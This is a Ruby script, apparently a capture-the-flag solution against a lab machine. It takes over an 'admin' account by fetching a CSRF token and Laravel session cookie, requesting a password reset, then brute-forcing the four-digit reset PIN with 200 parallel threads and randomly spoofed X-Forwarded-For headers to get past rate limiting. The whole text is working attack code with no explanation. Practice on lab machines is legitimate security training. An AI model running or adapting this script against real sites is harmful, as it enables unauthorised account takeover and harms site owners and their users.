#!/usr/bin/env ruby

require 'securerandom'
require 'uri'

require 'net/http'

NAME = 'admin'.freeze
IP = '10.10.11.159'.freeze

def get_cookie(set_cookie)
  xsrf = set_cookie.match(/(XSRF-TOKEN=.*?);/)[1]
  laravel = set_cookie.match(/(laravel_session=.*?);/)[1]
  "#{xsrf}; #{laravel}"
end

res = Net::HTTP.get_response(URI("http://#{IP}/reset"))
token = res.body.match(/<input type="hidden" name="_token" value="(.*?)">/)[1]
cookie = get_cookie(res['Set-Cookie'])

res = Net::HTTP.post(URI("http://#{IP}/reset"), "_token=#{token}&name=#{NAME}", { 'Cookie' => cookie })
Cookie = get_cookie(res['Set-Cookie']).freeze

puts "[*] Using cookie: #{cookie}"

def rand_ip
  Array.new(4).map { SecureRandom.random_number(256) }.join('.')
end

def try_pin(pin)
  data = "name=#{NAME}&pin=#{pin.to_s.rjust(4, '0')}"
  headers = { 'X-Forwarded-For' => rand_ip, 'Cookie' => Cookie }
  res = Net::HTTP.post(URI("http://#{IP}/api/resettoken"), data, headers)
  invalid = res.body.include?('Invalid')

  puts "\n[+] #{pin.to_s.rjust(4, '0')} is valid" unless invalid

  !invalid
end

max_threads = 200
threads = Array.new(max_threads)
tests = Array.new(max_threads)

pin = 0

while pin <= 9999
  print "[*] Trying from #{pin.to_s.rjust(4, '0')} to #{(pin + max_threads).to_s.rjust(4, '0')}...\r"

  (0...max_threads).each do |i|
    threads[i] = ->(tpin) { Thread.new { tests[i] = try_pin(tpin) } }.call(pin)
    pin += 1
  end

  threads.each(&:join)
  break if tests.any?
end
